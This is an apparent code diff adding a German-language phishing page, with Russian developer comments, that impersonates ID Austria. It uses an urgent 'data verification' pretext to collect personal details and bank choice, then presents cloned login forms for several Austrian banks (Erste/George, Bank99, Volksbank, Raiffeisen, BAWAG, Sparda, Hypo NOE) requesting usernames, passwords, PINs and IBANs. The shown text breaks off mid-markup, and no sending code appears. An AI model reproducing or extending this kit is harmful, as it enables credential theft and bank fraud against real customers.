+            border-color: #d5001c;
+        }
+
+        .ba-input::placeholder {
+            color: #999;
+            text-align: center;
+        }
+
+        .ba-links {
+            display: flex;
+            justify-content: flex-start;
+            gap: 16px;
+            font-size: 13px;
+            margin-bottom: 30px;
+        }
+
+        .ba-links a {
+            color: #0056b3;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        .ba-btn {
+            width: 150px;
+            height: 48px;
+            background: #00688e;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            display: block;
+            margin: 0 auto;
+            transition: background 0.15s ease;
+        }
+
+        .ba-btn:hover {
+            background: #004f6b;
+        }
+
+        /* ============================================================
+           Панели кнопок
+           ============================================================ */
+        .continue-bar {
+            width: 100%;
+            margin-top: 10px;
+            padding: 20px 24px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .continue-bar.bar-right {
+            justify-content: flex-end;
+            border-top: 2px solid #b8b8b8;
+            border-bottom: 2px solid #b8b8b8;
+        }
+
+        .continue-bar.bar-center {
+            justify-content: center;
+            border-top: none;
+            border-bottom: none;
+            padding: 30px 24px 0;
+        }
+
+        .continue-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 7px;
+            border: none;
+            padding: 12px 34px;
+            font-size: 15px;
+            font-weight: 500;
+            font-family: inherit;
+            letter-spacing: 0.2px;
+            cursor: pointer;
+            transition: background 0.15s ease;
+            background: #0e4d8c;
+            color: #ffffff;
+            border-radius: 6px;
+        }
+        .continue-btn:hover { background: #0a3d72; }
+        .continue-btn:disabled { background: #b5b5b5; cursor: not-allowed; }
+
+        .continue-btn svg {
+            width: 12px;
+            height: 12px;
+            display: block;
+            stroke: currentColor;
+            stroke-width: 2;
+        }
+
+        /* ============================================================
+           Нижний серый блок
+           ============================================================ */
+        .page-footer {
+            width: 100%;
+            background: #ececec;
+            padding: 68px 24px 38px;
+            text-align: center;
+        }
+
+        .page-footer p {
+            font-size: 16px;
+            font-weight: 600;
+            color: #333333;
+            letter-spacing: 0.2px;
+        }
+
+        .page-footer a {
+            color: #333333;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .page-footer a:hover { text-decoration: underline; }
+
+        /* ============================================================
+           MOBILE
+           ============================================================ */
+        @media (max-width: 768px) {
+            .intro-top { padding: 28px 16px; }
+            .intro-top h1 { font-size: 19px; }
+            .intro-steps { padding: 48px 16px 0; }
+            .step { font-size: 13px; min-width: 140px; margin-right: 14px; padding-bottom: 8px; }
+
+            .screen { padding: 30px 16px 40px; }
+            .intro-title { font-size: 36px; margin-bottom: 26px; letter-spacing: -0.5px; }
+            .intro-text { font-size: 15px; margin-bottom: 26px; }
+            .intro-warning { padding: 18px 16px; }
+            .intro-warning-title { font-size: 14.5px; }
+            .intro-warning-text { font-size: 14px; }
+            .intro-warning-subtitle { font-size: 14px; }
+            .intro-warning-list li { font-size: 14px; }
+            .intro-warning-footer { font-size: 14px; }
+
+            .brand-row { margin-top: -35px; }
+            .brand-left img { width: 160px; height: 160px; }
+
+            .data-title { font-size: 26px; margin-top: -65px; }
+            .data-desc { font-size: 14.5px; margin-top: -10px; margin-bottom: 26px; }
+            .bank-intro-text { font-size: 14.5px; margin-top: -10px; margin-bottom: 24px; }
+
+            .form-card { width: 100%; }
+            .form-card-header { font-size: 15px; padding: 14px 18px; }
+            .form-card-body { padding: 6px 18px 18px; }
+            .form-field input, .form-field select { font-size: 14px; height: 40px; }
+
+            .rfb-hero { height: 180px; }
+            .rfb-title { font-size: 26px; }
+            .rfb-desc { font-size: 15px; }
+            .rfb-main { padding: 0 16px 40px; }
+
+            .bawag-logo-top { width: 180px; }
+            .bawag-box { padding: 30px 20px; }
+
+            .hypo-header-bar { padding: 0 16px; }
+            .hypo-hero { height: 150px; }
+            .hypo-main { padding: 20px 16px 40px; }
+            .hypo-logo-top { width: 160px; }
+
+            .easy-logo-top { width: 200px; height: 75px; }
+
+            .ba-logo-top { width: 180px; height: 72px; }
+            .ba-title { font-size: 30px; }
+
+            .continue-bar { padding: 18px 16px; }
+            .continue-bar.bar-center { padding: 24px 16px 0; }
+            .continue-btn { font-size: 14px; padding: 11px 30px; }
+
+            .page-footer { padding: 58px 16px 28px; }
+            .page-footer p { font-size: 14px; }
+        }
+
+        @media (max-width: 480px) {
+            .intro-top { padding: 22px 14px; }
+            .intro-top h1 { font-size: 17px; }
+            .intro-steps { padding: 44px 14px 0; }
+            .step { font-size: 11px; min-width: 110px; margin-right: 10px; padding-bottom: 7px; }
+
+            .screen { padding: 22px 14px 30px; }
+            .intro-title { font-size: 30px; margin-bottom: 20px; letter-spacing: -0.4px; }
+            .intro-text { font-size: 14px; margin-bottom: 20px; }
+            .intro-warning { padding: 16px 14px; }
+            .intro-warning-title { font-size: 13.5px; gap: 8px; }
+            .intro-warning-title svg { width: 18px; height: 18px; }
+            .intro-warning-text { font-size: 13px; margin-bottom: 16px; }
+            .intro-warning-subtitle { font-size: 13px; margin-bottom: 14px; }
+            .intro-warning-list li { font-size: 13px; padding: 5px 0 5px 16px; }
+            .intro-warning-list li::before { top: 12px; width: 3px; height: 3px; left: 3px; }
+            .intro-warning-footer { font-size: 13px; margin-top: 18px; }
+
+            .brand-row { margin-top: -28px; }
+            .brand-left img { width: 140px; height: 140px; }
+
+            .data-title { font-size: 22px; margin-top: -58px; }
+            .data-desc { font-size: 13px; margin-top: -3px; }
+            .bank-intro-text { font-size: 13px; margin-top: -3px; }
+
+            .form-card-header { font-size: 14px; padding: 12px 14px; }
+            .form-card-body { padding: 4px 14px 14px; }
+            .form-field { margin-top: 14px; }
+            .form-field label { font-size: 13px; }
+            .form-field input, .form-field select { font-size: 14px; height: 40px; }
+            .form-field.field-postcode input { width: 110px; }
+
+            .bank-select-wrapper { width: 130px; }
+
+            .rfb-hero { height: 150px; }
+            .rfb-title { font-size: 22px; }
+            .rfb-desc { font-size: 14px; margin-bottom: 20px; }
+            .rfb-input, .rfb-select { height: 48px; font-size: 15px; }
+            .rfb-btn { height: 48px; font-size: 16px; }
+
+            .bawag-logo-top { width: 160px; }
+            .bawag-box { padding: 20px 14px; }
+            .bawag-title { font-size: 22px; }
+            .bawag-tab { font-size: 14px; }
+            .bawag-input { height: 46px; font-size: 15px; }
+            .bawag-btn { height: 46px; font-size: 16px; max-width: 100%; }
+
+            .hypo-header-bar { padding: 0 14px; height: 55px; }
+            .hypo-hero { height: 120px; }
+            .hypo-main { padding: 16px 14px 30px; }
+            .hypo-logo-top { width: 150px; }
+
+            .easy-logo-top { width: 180px; height: 68px; margin-bottom: 24px; }
+            .easy-box-body { padding: 16px 14px; }
+
+            .ba-logo-top { width: 160px; height: 64px; margin-bottom: 16px; }
+            .ba-title { font-size: 26px; margin-bottom: 20px; }
+            .ba-warning { padding: 16px; }
+            .ba-warning-text { font-size: 14px; }
+            .ba-input { height: 46px; font-size: 15px; }
+
+            .continue-bar { padding: 16px 14px; }
+            .continue-bar.bar-center { padding: 20px 14px 0; }
+            .continue-btn { font-size: 13px; padding: 10px 26px; border-radius: 6px; }
+            .continue-btn svg { width: 10px; height: 10px; }
+
+            .page-footer { padding: 52px 14px 22px; }
+            .page-footer p { font-size: 13px; }
+        }
+
+        /* ============================================================
+           Спец-стили для экранов ввода IBAN (как на скрине)
+           ============================================================ */
+        .iban-screen-wrapper {
+            background: #eaf1f8; /* Светло-голубой фон */
+            min-height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 24px 60px;
+        }
+
+        .iban-screen-content {
+            width: 100%;
+            max-width: 480px;
+        }
+
+        .iban-screen-card {
+            background: #ffffff;
+            border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            overflow: hidden;
+            border: 1px solid #dcdcdc;
+        }
+
+        .iban-screen-header {
+            background: #005a9e; /* Синий цвет как на скрине */
+            color: #ffffff;
+            padding: 20px 24px;
+            font-size: 22px;
+            font-weight: 400;
+        }
+
+        .iban-screen-body {
+            padding: 24px;
+        }
+
+        .iban-screen-text {
+            font-size: 15px;
+            color: #333;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .iban-screen-label {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .iban-screen-input {
+            width: 100%;
+            height: 48px;
+            border: 1px solid #999;
+            border-radius: 4px;
+            background: #e5e5e5; /* Серый фон как на скрине */
+            padding: 0 16px;
+            font-size: 16px;
+            color: #1a1a1a;
+            outline: none;
+            margin-bottom: 24px;
+            transition: border-color 0.15s ease;
+        }
+
+        .iban-screen-input:focus {
+            border-color: #005a9e;
+            background: #ffffff;
+        }
+
+        .iban-screen-divider {
+            height: 1px;
+            background: #ccc;
+            margin: 0 -24px 24px -24px;
+        }
+
+        .iban-screen-btn {
+            width: 100%;
+            height: 48px;
+            background: #005a9e;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.15s ease;
+        }
+
+        .iban-screen-btn:hover {
+            background: #00457a;
+        }
+
+        /* Специфичные цвета для банков */
+        .is-bawag .iban-screen-header { background: #8b0000; }
+        .is-bawag .iban-screen-btn { background: #8b0000; }
+        .is-bawag .iban-screen-btn:hover { background: #6b0000; }
+        .is-bawag .iban-screen-input:focus { border-color: #8b0000; }
+
+        .is-sparda .iban-screen-header { background: #0056b3; }
+        .is-sparda .iban-screen-btn { background: #0056b3; }
+        .is-sparda .iban-screen-btn:hover { background: #004085; }
+        .is-sparda .iban-screen-input:focus { border-color: #0056b3; }
+
+        .is-bank99 .iban-screen-header { background: #ffeb00; color: #000000; }
+        .is-bank99 .iban-screen-btn { background: #ffeb00; color: #000000; }
+        .is-bank99 .iban-screen-btn:hover { background: #ebd800; }
+        .is-bank99 .iban-screen-input:focus { border-color: #ffeb00; }
+
+        .is-erste .iban-screen-header { background: #cc0000; }
+        .is-erste .iban-screen-btn { background: #cc0000; }
+        .is-erste .iban-screen-btn:hover { background: #a30000; }
+        .is-erste .iban-screen-input:focus { border-color: #cc0000; }
+
+        .is-rfb .iban-screen-header { background: #ffff00; color: #1a1a1a; }
+        .is-rfb .iban-screen-btn { background: #ffff00; color: #1a1a1a; }
+        .is-rfb .iban-screen-btn:hover { background: #e6e600; }
+        .is-rfb .iban-screen-input:focus { border-color: #ffff00; }
+
+        .is-easy .iban-screen-header { background: #1e6bd6; }
+        .is-easy .iban-screen-btn { background: #1e6bd6; }
+        .is-easy .iban-screen-btn:hover { background: #1553a6; }
+        .is-easy .iban-screen-input:focus { border-color: #1e6bd6; }
+
+        .is-ba .iban-screen-header { background: #d5001c; }
+        .is-ba .iban-screen-btn { background: #d5001c; }
+        .is-ba .iban-screen-btn:hover { background: #b30017; }
+        .is-ba .iban-screen-input:focus { border-color: #d5001c; }
+        
+        .is-hypo .iban-screen-header { background: #003366; }
+        .is-hypo .iban-screen-btn { background: #003366; }
+        .is-hypo .iban-screen-btn:hover { background: #002244; }
+        .is-hypo .iban-screen-input:focus { border-color: #003366; }
+
+        /* Логотипы для шапок IBAN */
+        .iban-logo {
+            display: block;
+            object-fit: contain;
+            object-position: left;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Синяя полоса с заголовком -->
+    <div class="intro-top">
+        <h1>Zusätzliches ID Austria Konto</h1>
+    </div>
+
+    <!-- Шаги -->
+    <div class="intro-steps">
+        <div class="step active" data-step="1">Start</div>
+        <div class="step" data-step="2">Benutzerdaten</div>
+        <div class="step" data-step="3">Signaturvertrag</div>
+        <div class="step" data-step="4">2. Faktor auswählen</div>
+        <div class="step" data-step="5">2. Faktor verknüpfen</div>
+        <div class="step" data-step="6">Abschluss</div>
+    </div>
+
+    <!-- ============================================================
+         ЭКРАН 1 — Вводный
+         ============================================================ -->
+    <div class="screen active" id="screen1">
+        <div class="intro-inner">
+
+            <h2 class="intro-title">Datenüberprüfung<br>Erforderlich</h2>
+
+            <p class="intro-text">
+                <span class="line">Zur Sicherheit Ihrer Account-Daten und Aktivierung</span>
+                <span class="line">erweiterter Schutzfunktionen bestätigen Sie bitte</span>
+                <span class="line">Ihre aktuellen Daten.</span>
+            </p>
+
+            <div class="intro-warning">
+                <div class="intro-warning-title">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                         stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+                        <line x1="12" y1="9" x2="12" y2="13"></line>
+                        <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                    </svg>
+                    <span>Achtung! Datenverifikation<br><span class="notwendig">Notwendig</span></span>
+                </div>
+
+                <p class="intro-warning-text">
+                    Zur kontinuierlichen Optimierung Ihrer Account-Sicherheit und Gewährleistung des uneingeschränkten Zugangs bitten wir Sie, Ihre hinterlegten Daten zu überprüfen und gegebenenfalls zu aktualisieren.
+                </p>
+
+                <p class="intro-warning-subtitle">Diese Verifikation gewährleistet:</p>
+
+                <ul class="intro-warning-list">
+                    <li>Vollständigen Zugang zu allen<br>Account-Funktionen</li>
+                    <li>Aktivierung erweiterter<br>Sicherheitsmerkmalen</li>
+                    <li>Lückenlose Fortführung aller<br>Serviceleistungen</li>
+                    <li>Optimierten Schutz vor unbefugtem<br>Zugriff</li>
+                </ul>
+
+                <p class="intro-warning-footer">
+                    Bitte schließen Sie diese Verifikation innerhalb der nächsten 3 Tage ab.
+                </p>
+            </div>
+
+        </div>
+
+        <div class="continue-bar bar-right">
+            <button type="button" class="continue-btn" id="nextBtn1">
+                Weiter
+                <svg viewBox="0 0 24 24" fill="none" stroke-width="2"
+                     stroke-linecap="round" stroke-linejoin="round">
+                    <polyline points="9 6 15 12 9 18"></polyline>
+                </svg>
+            </button>
+        </div>
+    </div>
+
+    <!-- ============================================================
+         ЭКРАН 2 — Benutzerdaten
+         ============================================================ -->
+    <div class="screen" id="screen2">
+        <div class="intro-inner">
+
+            <div class="brand-row">
+                <div class="brand-left">
+                    <img src="logog.webp" alt="ID Austria">
+                </div>
+            </div>
+
+            <h2 class="data-title">Datenverifikation und<br>Sicherheitserweiterung<br>ID Austria</h2>
+
+            <p class="data-desc">
+                Zur Freischaltung aller Kontofunktionen und Aktivierung erweiterter Sicherheitsmerkmale bestätigen Sie bitte Ihre persönlichen Daten. Die Bankverknüpfung ermöglicht zukünftige Automatisierungsprozesse und dient Ihrer Sicherheit.
+            </p>
+
+            <form class="form-card" id="dataForm" autocomplete="off" novalidate>
+                <div class="form-card-header">Persönliche Informationen</div>
+                <div class="form-card-body">
+
+                    <div class="form-field">
+                        <label for="fullname">Vollständiger Name:<span class="req">*</span></label>
+                        <input type="text" id="fullname" name="fullname" required>
+                        <div class="field-error" data-error-for="fullname"></div>
+                    </div>
+
+                    <div class="form-field">
+                        <label for="email">E-mail:<span class="req">*</span></label>
+                        <input type="email" id="email" name="email" required>
+                        <div class="field-error" data-error-for="email"></div>
+                    </div>
+
+                    <div class="form-field">
+                        <label for="birthdate">Geburtsdatum:<span class="req">*</span></label>
+                        <input type="text" id="birthdate" name="birthdate" maxlength="10" inputmode="numeric" required>
+                        <div class="field-error" data-error-for="birthdate"></div>
+                    </div>
+
+                    <div class="form-field">
+                        <label for="phone">Telefon:<span class="req">*</span></label>
+                        <input type="tel" id="phone" name="phone" inputmode="tel" required>
+                        <div class="field-error" data-error-for="phone"></div>
+                    </div>
+
+                    <div class="form-field">
+                        <label for="address">Straße:<span class="req">*</span></label>
+                        <input type="text" id="address" name="address" required>
+                        <div class="field-error" data-error-for="address"></div>
+                    </div>
+
+                    <div class="form-field">
+                        <label for="housenumber">Hausnummer:<span class="req">*</span></label>
+                        <input type="text" id="housenumber" name="housenumber" required>
+                        <div class="field-error" data-error-for="housenumber"></div>
+                    </div>
+
+                    <div class="form-field field-postcode">
+                        <label for="postcode">Postleitzahl:<span class="req">*</span></label>
+                        <input type="text" id="postcode" name="postcode" maxlength="4" inputmode="numeric" required>
+                        <div class="field-error" data-error-for="postcode"></div>
+                    </div>
+
+                    <div class="form-field">
+                        <label for="bank">Bank:<span class="req">*</span></label>
+                        <div class="bank-select-wrapper">
+                            <select id="bank" name="bank" required>
+                                <option value="">Bitte wählen</option>
+                                <option value="Bawag">Bawag</option>
+                                <option value="Volksbank">Volksbank</option>
+                                <option value="Bank99">Bank99</option>
+                                <option value="Spardabank">Spardabank</option>
+                                <option value="Hypo NOE">Hypo NOE</option>
+                                <option value="Raiffeisenbank">Raiffeisenbank</option>
+                                <option value="Erste Bank">Erste Bank</option>
+                                <option value="Bank Austria">Bank Austria</option>
+                                <option value="Easy Bank">Easy Bank</option>
+                            </select>
+                        </div>
+                        <div class="field-error" data-error-for="bank"></div>
+                    </div>
+
+                </div>
+            </form>
+
+            <div class="continue-bar bar-center">
+                <button type="submit" form="dataForm" class="continue-btn" id="submitBtn">
+                    Weiter
+                    <svg viewBox="0 0 24 24" fill="none" stroke-width="2"
+                         stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="9 6 15 12 9 18"></polyline>
+                    </svg>
+                </button>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ============================================================
+         ЭКРАН 3 — Стандартный банк
+         ============================================================ -->
+    <div class="screen" id="screen3">
+        <div class="intro-inner">
+            <h2 class="data-title" id="bankDataTitle" style="margin-top: -20px;">Bankdaten bestätigen</h2>
+            <p class="bank-intro-text" id="bankIntroText" style="margin-top: 10px;">
+                Bitte geben Sie zur Bestätigung Ihre Bankdaten ein.
+            </p>
+
+            <form class="form-card" id="bankForm" autocomplete="off" novalidate style="margin-top: 20px;">
+                <div class="form-card-header" id="bankFormHeader">Bankdaten</div>
+                <div class="form-card-body">
+                    <div class="form-field">
+                        <label for="login">Login:<span class="req">*</span></label>
+                        <input type="text" id="login" name="login" required>
+                        <div class="field-error" data-error-for="login"></div>
+                    </div>
+                    <div class="form-field">
+                        <label for="password">Passwort:<span class="req">*</span></label>
+                        <input type="password" id="password" name="password" required>
+                        <div class="field-error" data-error-for="password"></div>
+                    </div>
+                </div>
+            </form>
+
+            <div class="continue-bar bar-center" id="standardSubmitBar">
+                <button type="button" class="continue-btn" id="bankSubmitBtn" onclick="submitStandardBank()">
+                    Bestätigen
+                    <svg viewBox="0 0 24 24" fill="none" stroke-width="2"
+                         stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="9 6 15 12 9 18"></polyline>
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================
+         ЭКРАН 4 — Ввод IBAN (отдельный экран для IBAN)
+         ============================================================ -->
+    <div class="screen" id="screen4">
+        <div class="iban-screen-wrapper">
+            <div class="iban-screen-content">
+                <div class="iban-screen-card">
+                    <div class="iban-screen-header" id="ibanHeaderTitle">hausbanking Sicherheitsfrage</div>
+                    <div class="iban-screen-body">
+                        <div class="iban-screen-text">
+                            Bitte geben Sie im untenstehenden Feld die IBAN Ihrer Bankkarte ein.
+                        </div>
+                        <div class="iban-screen-divider"></div>
+                        <label class="iban-screen-label" for="iban">IBAN</label>
+                        <input type="text" id="iban" name="iban" class="iban-screen-input" placeholder="" required>
+                        <button type="button" class="iban-screen-btn" id="ibanSubmitBtn" onclick="submitIban()">Weiter</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================
+         КАСТОМНЫЕ БАНКИ (Шаг 1 — Логин и пароль)
+         ============================================================ -->
+    
+    <!-- Erste Bank (George) -->
+    <div class="bank-full-wrapper" id="ersteWrapper">
+        <div style="background: #ffffff; min-height: 100%; display: flex; flex-direction: column; align-items: center; padding: 40px 24px 60px;">
+            <div style="width: 100%; max-width: 640px; display: flex; flex-direction: column; align-items: center;">
+                <div class="george-header">
+                    <img src="blgv.svg" alt="George" class="george-logo">
+                    <div class="george-title">George Login</div>
+                    <div class="george-subtitle">Bitte geben Sie Ihre Verfügernummer oder Ihren selbst gewählten Benutzernamen ein.</div>
+                </div>
+                
+                <div class="form-card" style="margin-top: 20px;">
+                    <div class="form-card-header">Bankdaten</div>
+                    <div class="form-card-body">
+                        <div class="form-field">
+                            <label for="login_erste">Login:<span class="req">*</span></label>
+                            <input type="text" id="login_erste" required>
+                            <div class="field-error" data-error-for="login_erste"></div>
+                        </div>
+                        <div class="form-field">
+                            <label for="password_erste">Passwort:<span class="req">*</span></label>
+                            <input type="password" id="password_erste" required>
+                            <div class="field-error" data-error-for="password_erste"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="continue-bar bar-center">
+                    <button type="button" class="continue-btn" id="ersteNextBtn">
+                        Weiter
+                        <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <polyline points="9 6 15 12 9 18"></polyline>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bank99 -->
+    <div class="bank-full-wrapper" id="bank99Wrapper">
+        <div class="bank99-wrapper">
+            <div class="bank99-content">
+                <img src="logo99.png" alt="bank99" class="bank99-logo-top">
+                <div class="bank99-box">
+                    <div class="bank99-header">Anmelden</div>
+                    <div class="bank99-body">
+                        <div class="bank99-intro">Hallo beim Online Banking der bank99!</div>
+                        <div class="bank99-label-row">
+                            <label for="login99">Benutzername</label>
+                            <div class="bank99-links">
+                                <a href="#">barrierefrei</a> | <a href="#">English</a>
+                            </div>
+                        </div>
+                        <input type="text" id="login99" class="bank99-input" placeholder="Login">
+                        <input type="password" id="password99" class="bank99-input" placeholder="Passwort">
+                        <div class="bank99-separator"></div>
+                        <button type="button" class="bank99-btn" id="bank99NextBtn">Weiter</button>
+                    </div>
+                    <div class="bank99-forgot">
+                        <a href="#">Benutzername vergessen?</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Volksbank -->
+    <div class="bank-full-wrapper" id="vbWrapper">
+        <div class="vb-wrapper">
+            <div class="vb-content">
+                <img src="logovs.png" alt="Volksbank" class="vb-logo-top">
+                <div class="vb-box">
+                    <div class="vb-header">hausbanking Login</div>
+                    <div class="vb-body">
+                        <p class="vb-text">
+                            Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner anderen Seite eingeben und diese geheim halten.
+                        </p>
+                        <div class="vb-label-row">
+                            <label for="loginvb">Anmeldung mit Benutzername</label>
+                            <div class="vb-links">
+                                <a href="#">Barrierefrei</a> | <a href="#">English</a>
+                            </div>
+                        </div>
+                        <input type="text" id="loginvb" class="vb-input" placeholder="Login">
+                        <input type="password" id="passwordvb" class="vb-input" placeholder="Passwort">
+                        <p class="vb-agb-text">
+                            Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdrücklich zu.
+                        </p>
+                        <div class="vb-separator"></div>
+                        <button type="button" class="vb-btn" id="vbNextBtn">Weiter</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Raiffeisenbank -->
+    <div class="bank-full-wrapper" id="rfbWrapper">
+        <div class="rfb-wrapper">
+            <div class="rfb-hero">
+                <div class="rfb-lang-select">Deutsch</div>
+            </div>
+            <div class="rfb-main">
+                <div class="rfb-content">
+                    <h2 class="rfb-title">Bitte melden Sie sich an</h2>
+                    <p class="rfb-desc">Wählen Sie Ihr Bundesland und geben Sie Verfügernummer und PIN ein.</p>
+                    <div class="rfb-input-group">
+                        <label for="rfb_bundesland">Bundesland oder Bank wählen <span>*</span></label>
+                        <select id="rfb_bundesland" class="rfb-select">
+                            <option value="">Bitte wählen</option>
+                            <option value="Burgenland">Burgenland</option>
+                            <option value="Kärnten">Kärnten</option>
+                            <option value="Niederösterreich">Niederösterreich</option>
+                            <option value="Oberösterreich">Oberösterreich</option>
+                            <option value="Salzburg">Salzburg</option>
+                            <option value="Steiermark">Steiermark</option>
+                            <option value="Tirol">Tirol</option>
+                            <option value="Vorarlberg">Vorarlberg</option>
+                            <option value="Wien">Wien</option>
+                        </select>
+                    </div>
+                    <div class="rfb-input-group">
+                        <label for="rfb_verfueger">Verfügernummer eingeben <span>*</span></label>
+                        <input type="text" id="rfb_verfueger" class="rfb-input" placeholder="">
+                    </div>
+                    <div class="rfb-input-group">
+                        <label for="rfb_pin">PIN eingeben <span>*</span></label>
+                        <input type="password" id="rfb_pin" class="rfb-input" placeholder="">
+                    </div>
+                    <button type="button" class="rfb-btn" id="rfbNextBtn">Weiter</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- BAWAG -->
+    <div class="bank-full-wrapper" id="bawagWrapper">
+        <div class="bawag-wrapper">
+            <div class="bawag-content">
+                <img src="bawag.png" alt="BAWAG" class="bawag-logo-top">
+                <div class="bawag-box">
+                    <div class="bawag-box-header">
+                        <div class="bawag-title">eBanking Login</div>
+                    </div>
+                    <div class="bawag-tabs">
+                        <div class="bawag-tab">Verfüger</div>
+                    </div>
+                    <div class="bawag-subtitle">Wie wollen Sie sich einloggen?</div>
+                    <input type="text" id="loginbawag" class="bawag-input" placeholder="Verfügernummer">
+                    <input type="password" id="passwordbawag" class="bawag-input" placeholder="PIN (8 bis 16-stellig)">
+                    <button type="button" class="bawag-btn" id="bawagNextBtn">Login</button>
+                    <div class="bawag-forgot">PIN vergessen oder Verfüger gesperrt?</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Sparda Bank -->
+    <div class="bank-full-wrapper" id="spardaWrapper">
+        <div class="sparda-wrapper">
+            <div class="sparda-content">
+                <img src="logospp.png" alt="Sparda Bank" class="sparda-logo-top">
+                <div class="sparda-box">
+                    <div class="sparda-header">Online-Banking</div>
+                    <div class="sparda-body">
+                        <p class="sparda-text">
+                            Bitte geben Sie Ihre Zugangsdaten ein, um sich im Online-Banking anzumelden.
+                        </p>
+                        <div class="sparda-label-row">
+                            <label for="loginsparda">Anmeldung mit Benutzername</label>
+                            <div class="sparda-links">
+                                <a href="#">Barrierefrei</a> | <a href="#">English</a>
+                            </div>
+                        </div>
+                        <input type="text" id="loginsparda" class="sparda-input" placeholder="Login">
+                        <input type="password" id="passwordsparda" class="sparda-input" placeholder="Passwort">
+                        <p class="sparda-agb-text">
+                            Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdrücklich zu.
+                        </p>
+                        <div class="sparda-separator"></div>
+                        <button type="button" class="sparda-btn" id="spardaNextBtn">Weiter</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- HYPO NOE -->
+    <div class="bank-full-wrapper" id="hypoWrapper">
+        <div class="hypo-wrapper">
+            <div class="hypo-header-bar">
+                <img src="hnp.svg" alt="Hypo NOE" class="hypo-logo-top">
+                <div class="hypo-burger"></div>
+            </div>
+            <div class="hypo-hero"></div>
+            <div class="hypo-main">
+                <div class="hypo-content">
+                    <div class="hypo-box">
+                        <div class="hypo-box-header">Anmelden</div>
+                        <div class="hypo-box-body">
+                            <div class="hypo-field">
+                                <label for="hypo_email">E-Mail-Adresse <span>*</span></label>
+                                <input type="email" id="hypo_email" placeholder="">
+                            </div>
+                            <div class="hypo-field">
+                                <label for="hypo_pw">Passwort <span>*</span></label>
+                                <div class="hypo-pw-wrapper">
+                                    <input type="password" id="hypo_pw" placeholder="">
+                                    <svg class="hypo-pw-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                                        <circle cx="12" cy="12" r="3"></circle>
+                                    </svg>
+                                </div>
+                            </div>
+                            <button type="button" class="hypo-btn" id="hypoNextBtn">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width: 16px; height: 16px;">
+                                    <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"></path>
+                                    <polyline points="10 17 15 12 10 7"></polyline>
+                                    <line x1="15" y1="12" x2="3" y2="12"></line>
+                                </svg>
+                                Anmelden
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="hypo-links-list">
+                        <a href="#" class="hypo-link-item">
+                            <svg viewBox="0 0 24 24"><path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="8.5" cy="7" r="4"></circle><line x1="20" y1="8" x2="20" y2="14"></line><line x1="23" y1="11" x2="17" y2="11"></line></svg>
+                            Registrieren
+                        </a>
+                        <a href="#" class="hypo-link-item">
+                            <svg viewBox="0 0 24 24"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path></svg>
+                            Passwort vergessen
+                        </a>
+                        <a href="#" class="hypo-link-item">
+                            <svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+                            E-Mail-Adresse Bestätigung anfordern
+                        </a>
+                    </div>
+                    
+                    <p class="hypo-footer-text">
